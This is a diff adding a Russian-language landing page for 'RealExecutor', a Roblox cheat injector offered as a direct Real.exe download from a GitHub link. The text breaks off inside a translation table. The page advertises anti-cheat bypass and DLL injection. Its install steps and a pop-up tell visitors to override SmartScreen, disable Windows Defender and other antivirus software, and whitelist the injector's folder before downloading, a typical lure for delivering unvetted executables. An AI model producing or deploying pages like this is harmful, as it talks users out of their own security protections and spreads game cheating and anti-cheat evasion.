@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<!--
+  ====================================================================
+  REALEXECUTOR — лендинг executor для Roblox с прямым скачиванием
+  ====================================================================
+-->
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RealExecutor — инжектор для Roblox — Скачать для Windows</title>
+<meta name="description" content="RealExecutor — скачать инжектор для Roblox бесплатно на Windows. Lua-инжект, Script Hub, No Key System, автообновление и обход античита.">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 8 8'%3E%3Crect width='8' height='8' fill='%23050505'/%3E%3Crect x='2' y='2' width='4' height='4' fill='%23fff' transform='rotate(45 4 4)'/%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Unbounded:wght@600;700;900&family=Manrope:wght@400;600;700;800&family=Press+Start+2P&display=swap" rel="stylesheet">
+<style>
+  *{margin:0;padding:0;box-sizing:border-box}
+  :root{
+    --bg:#050505; --bg2:#0a0a0a;
+    --panel:rgba(255,255,255,.03);
+    --border:rgba(255,255,255,.09);
+    --text:#f2f2f2; --muted:#9b9b9b;
+    --accent:#ffffff; --accent2:#a8a8a8;
+    --grad:linear-gradient(135deg,#ffffff,#a8a8a8);
+  }
+  html{scroll-behavior:smooth}
+  body{
+    font-family:'Manrope',sans-serif;background:var(--bg);color:var(--text);
+    line-height:1.6;overflow-x:hidden;font-size:16px;
+  }
+  body::before{content:'';position:fixed;inset:0;z-index:-2;
+    background:
+      radial-gradient(900px 500px at 85% -10%,rgba(255,255,255,.07),transparent 60%),
+      radial-gradient(700px 500px at 5% 110%,rgba(255,255,255,.05),transparent 60%),
+      var(--bg);}
+  body::after{content:'';position:fixed;inset:0;z-index:-1;
+    background-image:
+      linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),
+      linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);
+    background-size:44px 44px;
+    -webkit-mask-image:radial-gradient(ellipse at 50% 0%,#000 30%,transparent 75%);
+    mask-image:radial-gradient(ellipse at 50% 0%,#000 30%,transparent 75%);}
+  ::selection{background:rgba(255,255,255,.35)}
+  ::-webkit-scrollbar{width:10px}
+  ::-webkit-scrollbar-thumb{background:#2b2b2b;border-radius:8px}
+  a:focus-visible,button:focus-visible{outline:2px solid var(--accent);outline-offset:3px;border-radius:8px}
+  .container{width:min(1140px,92%);margin:0 auto}
+
+  /* ================= ШАПКА ================= */
+  .site-header{position:fixed;top:0;left:0;right:0;z-index:100;
+    background:rgba(5,5,5,.78);backdrop-filter:blur(14px);-webkit-backdrop-filter:blur(14px);
+    border-bottom:1px solid var(--border)}
+  .header-inner{display:flex;align-items:center;gap:26px;height:72px}
+  .logo{display:flex;align-items:center;gap:10px;text-decoration:none;color:var(--text);
+    font-family:'Unbounded';font-weight:700;font-size:17px;letter-spacing:.06em}
+  .logo-cube{width:26px;height:26px;flex:none}
+  .site-nav{display:flex;gap:26px}
+  .site-nav a{color:var(--muted);text-decoration:none;font-size:14px;font-weight:600;transition:color .25s}
+  .site-nav a:hover{color:var(--text)}
+  .header-actions{display:flex;align-items:center;gap:14px;margin-left:auto}
+  .lang{position:relative}
+  .lang-btn{display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.04);
+    border:1px solid var(--border);color:var(--text);font-weight:700;font-size:13px;
+    padding:8px 12px;border-radius:10px;cursor:pointer;font-family:'Manrope'}
+  .lang-menu{position:absolute;top:calc(100% + 8px);right:0;background:#111111;
+    border:1px solid var(--border);border-radius:12px;list-style:none;min-width:150px;
+    padding:6px;opacity:0;pointer-events:none;transform:translateY(-6px);transition:.25s;z-index:60}
+  .lang.open .lang-menu{opacity:1;pointer-events:auto;transform:none}
+  .lang-menu li{padding:9px 12px;border-radius:8px;font-size:13.5px;color:var(--muted);cursor:pointer}
+  .lang-menu li:hover{background:rgba(255,255,255,.05);color:var(--text)}
+  .lang-menu li.active{color:var(--accent)}
+  .burger{display:none;flex-direction:column;gap:5px;background:none;border:none;cursor:pointer;padding:8px}
+  .burger span{width:22px;height:2px;background:var(--text);border-radius:2px}
+
+  /* ================= КНОПКИ ================= */
+  .btn{display:inline-flex;align-items:center;justify-content:center;gap:10px;border:none;cursor:pointer;
+    text-decoration:none;font-family:'Manrope';font-weight:800;border-radius:12px;
+    transition:transform .25s,box-shadow .25s,filter .25s,border-color .25s}
+  .btn-primary{background:var(--grad);color:#050505;padding:12px 22px;
+    box-shadow:0 10px 30px -10px rgba(255,255,255,.55)}
+  .btn-primary:hover{transform:translateY(-2px);filter:brightness(1.07);
+    box-shadow:0 16px 40px -10px rgba(255,255,255,.7)}
+  .btn-ghost{background:rgba(255,255,255,.04);color:var(--text);border:1px solid var(--border);padding:12px 22px}
+  .btn-ghost:hover{border-color:rgba(255,255,255,.3);transform:translateY(-2px)}
+  .btn-sm{padding:10px 18px;font-size:14px;border-radius:10px}
+  .btn-xl{flex-direction:column;gap:4px;padding:17px 36px;border-radius:18px}
+  .btn-xl .xl-row{display:flex;align-items:center;gap:10px;font-size:17px}
+  .btn-xl small{font-size:11.5px;font-weight:700;opacity:.75}
+
+  /* ================= HERO ================= */
+  .hero{padding:160px 0 90px}
+  .hero-grid{display:block;max-width:820px;margin:0 auto;text-align:center}
+  .pill{display:inline-flex;align-items:center;gap:10px;font-family:'Press Start 2P';font-size:9px;
+    color:var(--accent);background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.3);
+    padding:10px 16px;border-radius:100px;letter-spacing:.04em}
+  .pill i{width:7px;height:7px;border-radius:2px;background:var(--accent);animation:blink 1.6s infinite;flex:none}
+  h1{font-family:'Unbounded';font-weight:900;font-size:clamp(38px,5.6vw,66px);
+    line-height:1.05;margin:22px 0 18px;letter-spacing:-.01em}
+  h1 .grad{background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent;display:block}
+  .hero-about{color:var(--muted);font-size:16.5px;max-width:640px;margin:0 auto 34px}
+  .hero-actions{display:flex;gap:16px;flex-wrap:wrap;align-items:center;justify-content:center}
+  .stats{display:flex;margin-top:46px;flex-wrap:wrap;row-gap:20px;justify-content:center}
+  .stat{display:flex;flex-direction:column}
+  .stat b{font-family:'Unbounded';font-weight:700;font-size:23px}
+  .stat span{color:var(--muted);font-size:13px;margin-top:4px}
+  .stat + .stat{border-left:1px solid var(--border);padding-left:34px;margin-left:34px}
+
+  /* ================= СЕКЦИИ ================= */
+  section{padding:88px 0}
+  .sec-head{max-width:640px;margin-bottom:44px}
+  .kicker{font-family:'Press Start 2P';font-size:9px;color:var(--accent);
+    letter-spacing:.14em;margin-bottom:16px;display:block}
+  h2{font-family:'Unbounded';font-weight:700;font-size:clamp(26px,3.6vw,38px);line-height:1.15}
+  .sec-sub{color:var(--muted);margin-top:14px;font-size:15.5px}
+  .grid-3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:26px;transition:.3s}
+  .card:hover{border-color:rgba(255,255,255,.45);transform:translateY(-4px);background:rgba(255,255,255,.04)}
+  .card .ic{width:46px;height:46px;border-radius:12px;background:rgba(255,255,255,.12);
+    border:1px solid rgba(255,255,255,.25);display:flex;align-items:center;justify-content:center;
+    margin-bottom:18px;color:var(--accent)}
+  .card h3{font-family:'Unbounded';font-size:16.5px;font-weight:600;margin-bottom:10px}
+  .card p{color:var(--muted);font-size:14px}
+  .step{background:var(--panel);border:1px solid var(--border);border-radius:16px;padding:28px}
+  .step .num{font-family:'Press Start 2P';font-size:11px;color:var(--accent);
+    margin-bottom:18px;display:block}
+  .step h3{font-family:'Unbounded';font-size:17px;font-weight:600;margin-bottom:10px}
+  .step p{color:var(--muted);font-size:14px}
+
+  /* ================= CTA СКАЧАТЬ ================= */
+  .cta-wrap{border-radius:26px;padding:1px;
+    background:linear-gradient(135deg,rgba(255,255,255,.55),rgba(255,255,255,.35),rgba(255,255,255,.15))}
+  .cta{background:#0b0b0b;border-radius:25px;padding:64px 32px;text-align:center}
+  .cta .kicker{margin-bottom:14px}
+  .cta-text{color:var(--muted);max-width:560px;margin:16px auto 34px;font-size:15.5px}
+  .file-meta{margin-top:20px;font-family:'Press Start 2P';font-size:8px;color:var(--muted);letter-spacing:.04em}
+  .reqs{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-top:26px}
+  .req{font-size:12.5px;color:var(--muted);border:1px solid var(--border);
+    padding:8px 15px;border-radius:100px;background:rgba(255,255,255,.02)}
+
+  /* ================= ПЛАШКА: ПРЕДУПРЕЖДЕНИЕ ОБ АНТИВИРУСЕ ================= */
+  .av-banner{display:flex;align-items:center;gap:16px;text-align:left;width:100%;
+    max-width:620px;margin:0 auto 34px;padding:16px 20px;cursor:pointer;
+    background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.22);
+    border-radius:16px;position:relative;overflow:hidden;transition:.3s}
+  .av-banner:hover{border-color:rgba(255,255,255,.5);background:rgba(255,255,255,.06);transform:translateY(-2px)}
+  .av-banner::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;
+    background:linear-gradient(180deg,#ffffff,#a8a8a8)}
+  .av-banner-ic{width:44px;height:44px;flex:none;border-radius:12px;color:#ffffff;
+    display:flex;align-items:center;justify-content:center;
+    background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.32);
+    animation:warnPulse 2s ease-in-out infinite}
+  .av-banner-body{display:flex;flex-direction:column;gap:3px}
+  .av-banner-body b{font-size:14.5px;font-weight:800;color:var(--text)}
+  .av-banner-body span{font-size:13px;color:var(--muted);line-height:1.5}
+  .av-banner-arrow{margin-left:auto;flex:none;color:var(--muted);transition:.3s}
+  .av-banner:hover .av-banner-arrow{transform:translateX(4px);color:var(--text)}
+
+  /* ================= ПОДВАЛ / ТОСТ ================= */
+  footer{border-top:1px solid var(--border);padding:34px 0;margin-top:40px}
+  .foot-inner{display:flex;justify-content:space-between;gap:22px;flex-wrap:wrap;align-items:center}
+  .foot-note{color:var(--muted);font-size:12.5px;max-width:600px}
+  .foot-copy{color:var(--muted);font-size:12.5px}
+  .toast{position:fixed;bottom:26px;left:50%;transform:translate(-50%,150%);z-index:200;
+    background:#111111;border:1px solid rgba(255,255,255,.5);color:var(--text);
+    padding:14px 20px;border-radius:14px;display:flex;gap:12px;align-items:center;
+    font-size:14px;font-weight:700;max-width:92%;
+    box-shadow:0 20px 50px -12px rgba(0,0,0,.7);
+    transition:transform .45s cubic-bezier(.2,.9,.3,1.2)}
+  .toast.show{transform:translate(-50%,0)}
+  .toast svg{color:var(--accent);flex:none}
+
+  /* ================= МОДАЛКА АНТИВИРУС ================= */
+  .modal-overlay{position:fixed;inset:0;z-index:300;display:flex;align-items:center;justify-content:center;
+    padding:20px;background:rgba(0,0,0,.85);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
+    opacity:0;pointer-events:none;transition:opacity .3s}
+  .modal-overlay.show{opacity:1;pointer-events:auto}
+  .modal{width:min(560px,100%);background:#0b0b0b;border-radius:22px;padding:2px;
+    background-image:linear-gradient(135deg,rgba(255,255,255,.6),rgba(255,255,255,.4),rgba(255,255,255,.2));
+    transform:translateY(24px) scale(.97);transition:transform .35s cubic-bezier(.2,.9,.3,1.2);
+    box-shadow:0 40px 90px -30px rgba(0,0,0,.85)}
+  .modal-overlay.show .modal{transform:none}
+  .modal-inner{background:#0b0b0b;border-radius:21px;padding:34px 30px 28px;text-align:center;
+    position:relative;overflow:hidden}
+  .modal-inner::before{content:'';position:absolute;top:-60px;left:50%;transform:translateX(-50%);
+    width:240px;height:180px;background:radial-gradient(circle,rgba(255,255,255,.18),transparent 70%);pointer-events:none}
+  .modal-ic{width:64px;height:64px;border-radius:18px;margin:0 auto 20px;
+    display:flex;align-items:center;justify-content:center;
+    background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.35);color:#ffffff;
+    animation:warnPulse 2s ease-in-out infinite}
+  .modal h3{font-family:'Unbounded';font-size:20px;font-weight:700;line-height:1.25;margin-bottom:14px}
+  .modal p{color:var(--muted);font-size:14.5px;margin-bottom:10px}
+  .modal .warn-list{text-align:left;margin:18px auto 0;max-width:440px;display:flex;flex-direction:column;gap:10px}
+  .modal .warn-list li{list-style:none;display:flex;gap:11px;align-items:flex-start;
+    font-size:13.5px;color:var(--muted);background:rgba(255,255,255,.03);
+    border:1px solid var(--border);border-radius:12px;padding:11px 14px}
+  .modal .warn-list li svg{flex:none;margin-top:2px;color:#ffffff}
+  .modal .warn-list li b{color:var(--text);font-weight:700}
+  .modal-actions{display:flex;gap:12px;margin-top:26px;justify-content:center;flex-wrap:wrap}
+  .btn-warn{background:linear-gradient(135deg,#ffffff,#cfcfcf);color:#050505;padding:14px 26px;
+    font-size:15px;border-radius:12px;box-shadow:0 12px 34px -12px rgba(255,255,255,.6)}
+  .btn-warn:hover{transform:translateY(-2px);filter:brightness(1.06);
+    box-shadow:0 18px 44px -12px rgba(255,255,255,.75)}
+  .btn-cancel{background:rgba(255,255,255,.04);color:var(--text);border:1px solid var(--border);
+    padding:14px 24px;font-size:15px;border-radius:12px}
+  .btn-cancel:hover{border-color:rgba(255,255,255,.3);transform:translateY(-2px)}
+  .modal-note{margin-top:18px;font-size:12px;color:var(--muted);opacity:.85}
+
+  /* ================= АНИМАЦИИ ================= */
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:.25}}
+  @keyframes warnPulse{0%,100%{box-shadow:0 0 0 0 rgba(255,255,255,.35)}50%{box-shadow:0 0 0 14px rgba(255,255,255,0)}}
+  .reveal{opacity:0;transform:translateY(26px);transition:opacity .7s,transform .7s}
+  .reveal.in{opacity:1;transform:none}
+
+  /* ================= АДАПТИВ ================= */
+  @media(max-width:960px){
+    .hero{padding-top:130px}
+    .grid-3{grid-template-columns:1fr 1fr}
+    .grid-3.steps{grid-template-columns:1fr}
+    .site-nav{display:none;position:absolute;top:100%;left:0;right:0;
+      background:rgba(5,5,5,.97);border-bottom:1px solid var(--border);
+      flex-direction:column;padding:18px 5%;gap:16px}
+    body.nav-open .site-nav{display:flex}
+    .burger{display:flex}
+    .stat + .stat{border-left:none;padding-left:0;margin-left:0}
+    .stats{gap:28px}
+  }
+  @media(max-width:600px){
+    .grid-3{grid-template-columns:1fr}
+    .av-banner{align-items:flex-start}
+    .av-banner-arrow{display:none}
+    .btn-xl{padding:15px 26px}
+    .btn-xl .xl-row{font-size:15px}
+    .cta{padding:44px 20px}
+    .header-actions .btn{display:none}
+    .modal-inner{padding:26px 20px 22px}
+    .modal-actions{flex-direction:column}
+    .modal-actions .btn{width:100%}
+  }
+</style>
+</head>
+<body>
+
+<!-- ============ ШАПКА ============ -->
+<header class="site-header">
+  <div class="container header-inner">
+    <a href="#home" class="logo" aria-label="RealExecutor">
+      <svg class="logo-cube" viewBox="0 0 24 24" aria-hidden="true">
+        <defs><linearGradient id="lg1" x1="0" y1="0" x2="1" y2="1">
+          <stop offset="0" stop-color="#ffffff"/><stop offset="1" stop-color="#a8a8a8"/>
+        </linearGradient></defs>
+        <path d="M12 1.5 21.5 6.8v10.4L12 22.5 2.5 17.2V6.8L12 1.5z" fill="url(#lg1)"/>
+        <path d="M12 1.5 21.5 6.8 12 12 2.5 6.8 12 1.5z" fill="#fff" opacity=".22"/>
+        <path d="M2.5 6.8v10.4L12 12V1.5z" fill="#000" opacity=".18"/>
+        <path d="M21.5 6.8v10.4L12 12 21.5 6.8z" fill="#000" opacity=".3"/>
+      </svg>
+      REALEXECUTOR
+    </a>
+    <nav class="site-nav">
+      <a href="#home" data-i18n="nav_home">Главная</a>
+      <a href="#features" data-i18n="nav_features">Возможности</a>
+      <a href="#install" data-i18n="nav_install">Установка</a>
+    </nav>
+    <div class="header-actions">
+      <div class="lang" id="lang">
+        <button class="lang-btn" id="langBtn" aria-label="Язык">
+          <span id="langLabel">RU</span>
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
+        </button>
+        <ul class="lang-menu">
+          <li data-lang="ru" class="active">Русский</li>
+          <li data-lang="en">English</li>
+        </ul>
+      </div>
+      <a class="btn btn-primary btn-sm" data-dl href="#" data-i18n="btn_download_sm">Скачать</a>
+      <button class="burger" id="burger" aria-label="Меню"><span></span><span></span><span></span></button>
+    </div>
+  </div>
+</header>
+
+<main>
+<!-- ============ HERO ============ -->
+<section class="hero" id="home">
+  <div class="container hero-grid">
+    <div class="hero-copy">
+      <span class="pill reveal"><i></i><span data-i18n="pill">EXECUTOR · ДЛЯ ROBLOX</span></span>
+      <h1 class="reveal" style="transition-delay:.08s">REAL<span class="grad">EXECUTOR</span></h1>
+      <p class="hero-about reveal" style="transition-delay:.16s" data-i18n="hero_about">
+        RealExecutor — быстрый и стабильный инжектор для Roblox: исполняй любые Lua-скрипты,
+        пользуйся встроенным Script Hub и получай преимущество без ключей и оплаты.
+        Просто скачай и играй.
+      </p>
+      <div class="hero-actions reveal" style="transition-delay:.24s">
+        <a class="btn btn-primary btn-xl" data-dl href="#">
+          <span class="xl-row">
+            <svg width="19" height="19" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M3 5.5 10.5 4.4v7.1H3zM11.5 4.2 21 3v8.5h-9.5zM3 12.5h7.5v7.1L3 18.6zM11.5 12.5H21V21l-9.5-1.3z"/></svg>
+            <span data-i18n="btn_download">Скачать для Windows</span>
+          </span>
+          <small data-i18n="hero_sub">Бесплатно · Windows 10/11 · файл .exe</small>
+        </a>
+        <a class="btn btn-ghost" href="#features">
+          <span data-i18n="btn_details">Подробнее</span>
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
+        </a>
+      </div>
+      <div class="stats reveal" style="transition-delay:.32s">
+        <div class="stat"><b><span class="count" data-count="50000" data-suffix="+">0+</span></b><span data-i18n="stat1">скачиваний</span></div>
+        <div class="stat"><b>v4.2</b><span data-i18n="stat2">версия</span></div>
+        <div class="stat"><b><span class="count" data-count="240" data-suffix="+">0+</span></b><span data-i18n="stat3">FPS даже на слабых ПК</span></div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ============ ВОЗМОЖНОСТИ ============ -->
+<section id="features">
+  <div class="container">
+    <div class="sec-head reveal">
+      <span class="kicker" data-i18n="feat_kicker">ВОЗМОЖНОСТИ</span>
+      <h2 data-i18n="feat_title">Всё для комфортной игры</h2>
+      <p class="sec-sub" data-i18n="feat_sub">Всё, за что любят топовые инжекторы — уже внутри, бесплатно и без ограничений.</p>
+    </div>
+    <div class="grid-3">
+      <div class="card reveal">
+        <div class="ic"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M20.5 3.5 17 4.5 7.5 14l2.5 2.5L19.5 7z"/><path d="M6.5 13 4 15.5l4.5 4.5L11 17.5"/><path d="M3.5 17.5l3 3"/></svg></div>
+        <h3>Lua Executor</h3>
+        <p data-i18n="f1d">Мгновенный инжект и стабильное исполнение любых Lua-скриптов: от простых читов до сложных кастомных GUI.</p>
+      </div>
+      <div class="card reveal" style="transition-delay:.08s">
+        <div class="ic"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M6 3h12l4 6-10 13L2 9l4-6z"/><path d="M11 3 8 9l4 13 4-13-3-6"/><path d="M2 9h20"/></svg></div>
+        <h3>Script Hub</h3>
+        <p data-i18n="f2d">Встроенная библиотека из 500+ популярных скриптов: Infinite Yield, Dex и многое другое — запускай любой скрипт в один клик, без поиска по форумам.</p>
+      </div>
+      <div class="card reveal" style="transition-delay:.16s">
+        <div class="ic"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M13 2 4.5 13.5H11L10 22l8.5-11.5H12L13 2z"/></svg></div>
+        <h3>FPS Boost</h3>
+        <p data-i18n="f3d">Глубокая оптимизация рендера. Стабильные 240+ FPS даже на слабых ПК.</p>
+      </div>
+      <div class="card reveal">
+        <div class="ic"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="4.5"/><path d="M12 3v4.5M12 16.5V21M3 12h4.5M16.5 12H21M5.6 5.6l3.2 3.2M15.2 15.2l3.2 3.2M18.4 5.6l-3.2 3.2M8.8 15.2l-3.2 3.2"/></svg></div>
+        <h3>No Key System</h3>
+        <p data-i18n="f4d">Никаких ключей, сокращателей ссылок и ожидания: скачал — запустил — играешь. Полный доступ сразу после установки.</p>
+      </div>
+      <div class="card reveal" style="transition-delay:.08s">
+        <div class="ic"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg></div>
+        <h3 data-i18n="f5t">Автообновление</h3>
+        <p data-i18n="f5d">RealExecutor сам подстраивается под обновления Roblox: патчи выходят в течение 24 часов после апдейта игры.</p>
+      </div>
+      <div class="card reveal" style="transition-delay:.16s">
+        <div class="ic"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><rect x="5" y="8" width="14" height="11" rx="2.5"/><path d="M12 8V5"/><circle cx="12" cy="4" r="1" fill="currentColor"/><circle cx="9.5" cy="13" r="1.1" fill="currentColor"/><circle cx="14.5" cy="13" r="1.1" fill="currentColor"/><path d="M9.5 16.5h5"/></svg></div>
+        <h3>Anti-Detect</h3>
+        <p data-i18n="f6d">Продвинутый обход античита Hyperion/Byfron: инжект остаётся незаметным для системы, а твой аккаунт — под защитой.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ УСТАНОВКА ============ -->
+<section id="install">
+  <div class="container">
+    <div class="sec-head reveal">
+      <span class="kicker" data-i18n="inst_kicker">УСТАНОВКА</span>
+      <h2 data-i18n="inst_title">Три шага — и ты в игре</h2>
+    </div>
+    <div class="grid-3 steps">
+      <div class="step reveal">
+        <span class="num">01</span>
+        <h3 data-i18n="s1t">Скачай RealExecutor</h3>
+        <p data-i18n="s1d">Нажми «Скачать для Windows» и сохрани файл .exe на компьютер.</p>
+      </div>
+      <div class="step reveal" style="transition-delay:.08s">
+        <span class="num">02</span>
+        <h3 data-i18n="s2t">Запусти установку</h3>
+        <p data-i18n="s2d">Открой скачанный файл RealExecutor.exe. Если SmartScreen предупредит — «Подробнее» → «Выполнить в любом случае».</p>
+      </div>
+      <div class="step reveal" style="transition-delay:.16s">
+        <span class="num">03</span>
+        <h3 data-i18n="s3t">Играй</h3>
+        <p data-i18n="s3d">Запусти Roblox, нажми Attach в RealExecutor и выполняй любые скрипты через редактор (Ctrl+E) или Script Hub.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ СКАЧАТЬ ============ -->
+<section id="download">
+  <div class="container">
+    <div class="cta-wrap reveal">
+      <div class="cta">
+        <span class="kicker" data-i18n="dl_kicker">СКАЧАТЬ</span>
+        <h2 data-i18n="dl_title">RealExecutor v4.2</h2>
+        <p class="cta-text" data-i18n="dl_text">
+          Прямая ссылка уже работает — жми кнопку и забирай RealExecutor бесплатно. Приятной игры!
+        </p>
+        <!-- ============ ПЛАШКА: АНТИВИРУС МОЖЕТ РУГАТЬСЯ НА ФАЙЛ ============ -->
+        <div class="av-banner reveal" id="avBanner" role="button" tabindex="0">
+          <div class="av-banner-ic">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M12 2 4 5.5v5.2c0 5 3.4 9.6 8 11.3 4.6-1.7 8-6.3 8-11.3V5.5L12 2z"/>
+              <path d="M12 8v5"/>
+              <circle cx="12" cy="16.2" r=".8" fill="currentColor" stroke="none"/>
+            </svg>
+          </div>
+          <div class="av-banner-body">
+            <b data-i18n="avb_title">Антивирус может ругаться на файл</b>
+            <span data-i18n="avb_text">Real.exe внедряет DLL в процесс Roblox — Windows Defender и другие антивирусы могут блокировать загрузку или удалять файл. Это нормально: добавьте его в исключения.</span>
+          </div>
+          <svg class="av-banner-arrow" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M9 6l6 6-6 6"/></svg>
+        </div>
+        <a class="btn btn-primary btn-xl" data-dl href="#">
+          <span class="xl-row">
+            <svg width="19" height="19" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M3 5.5 10.5 4.4v7.1H3zM11.5 4.2 21 3v8.5h-9.5zM3 12.5h7.5v7.1L3 18.6zM11.5 12.5H21V21l-9.5-1.3z"/></svg>
+            <span data-i18n="btn_download">Скачать для Windows</span>
+          </span>
+          <small data-i18n="hero_sub">Бесплатно · Windows 10/11 · файл .exe</small>
+        </a>
+        <div class="file-meta" data-i18n="file_meta">Real.exe · Windows x64</div>
+        <div class="reqs">
+          <span class="req" data-i18n="req1">Windows 10 / 11 (x64)</span>
+          <span class="req" data-i18n="req2">4 ГБ ОЗУ</span>
+          <span class="req" data-i18n="req3">VC++ Redist — в комплекте</span>
+          <span class="req" data-i18n="req4">~120 МБ на диске</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer>
+  <div class="container foot-inner">
+    <p class="foot-note" data-i18n="footer_text">RealExecutor — неофициальный инструмент. Проект не связан с Roblox Corporation. Roblox — торговая марка Roblox Corporation.</p>
+    <p class="foot-copy" data-i18n="footer_copy">© 2025 RealExecutor. Сделано игроками для игроков.</p>
+  </div>
+</footer>
+
+<!-- всплывающее уведомление (запасное, если ссылку уберут) -->
+<div class="toast" id="toast" role="status">
+  <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3.5 2"/></svg>
+  <span id="toastText"></span>
+</div>
+
+<!-- ============ МОДАЛКА: ПРЕДУПРЕЖДЕНИЕ ОБ АНТИВИРУСЕ ============ -->
+<div class="modal-overlay" id="avModal" role="dialog" aria-modal="true" aria-labelledby="avTitle">
+  <div class="modal">
+    <div class="modal-inner">
+      <div class="modal-ic">
+        <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M12 2 4 5.5v5.2c0 5 3.4 9.6 8 11.3 4.6-1.7 8-6.3 8-11.3V5.5L12 2z"/>
+          <path d="M12 8v5"/>
+          <circle cx="12" cy="16.2" r=".8" fill="currentColor" stroke="none"/>
+        </svg>
+      </div>
+      <h3 id="avTitle" data-i18n="av_title">Выключи антивирус перед скачиванием</h3>
+      <p data-i18n="av_text">
+        Это инжектор: он внедряет <b>DLL в процесс Roblox</b>. Поэтому Windows Defender и сторонние антивирусы могут ругаться, блокировать установку или удалять файлы.
+      </p>
+      <ul class="warn-list">
+        <li>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M5 12.5 10 17.5 19 7"/></svg>
+          <span data-i18n="av_l1">Временно <b>отключи антивирус</b> (Windows Defender, Avast, Kaspersky и т.д.) на время скачивания и установки.</span>
+        </li>
+        <li>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M5 12.5 10 17.5 19 7"/></svg>
+          <span data-i18n="av_l2">Добавь папку инжектора в <b>исключения антивируса</b>, чтобы он не удалил DLL после запуска.</span>
+        </li>
+        <li>
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M5 12.5 10 17.5 19 7"/></svg>
+          <span data-i18n="av_l3">Если браузер или система блокируют загрузку — <b>разреши сохранение файла</b>.</span>
+        </li>
+      </ul>
+      <div class="modal-actions">
+        <button class="btn btn-warn" id="avConfirm" data-i18n="av_confirm">Я выключил антивирус — скачать</button>
+        <button class="btn btn-cancel" id="avCancel" data-i18n="av_cancel">Отмена</button>
+      </div>
+      <p class="modal-note" data-i18n="av_note">Инжектор не содержит вирусов, но антивирусы реагируют на внедрение DLL и обход защиты Roblox.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+/* ==================================================================
+   >>> ПРЯМАЯ ССЫЛКА НА СКАЧИВАНИЕ (файл Real.exe с GitHub) <<<
+   ================================================================== */
+const DOWNLOAD_URL = "https://github.com/OceanPlay1/Reeal/raw/main/Real.exe";
+
+/* ---------------- Переводы RU / EN ---------------- */
+const I18N = {
+  ru: {
+    title:"RealExecutor — инжектор для Roblox — Скачать для Windows",
+    nav_home:"Главная", nav_features:"Возможности", nav_install:"Установка",
+    btn_download_sm:"Скачать", btn_download:"Скачать для Windows", btn_details:"Подробнее",
+    pill:"EXECUTOR · ДЛЯ ROBLOX",
+    hero_about:"RealExecutor — быстрый и стабильный инжектор для Roblox: исполняй любые Lua-скрипты, пользуйся встроенным Script Hub и получай преимущество без ключей и оплаты. Просто скачай и играй.",
+    hero_sub:"Бесплатно · Windows 10/11 · файл .exe",
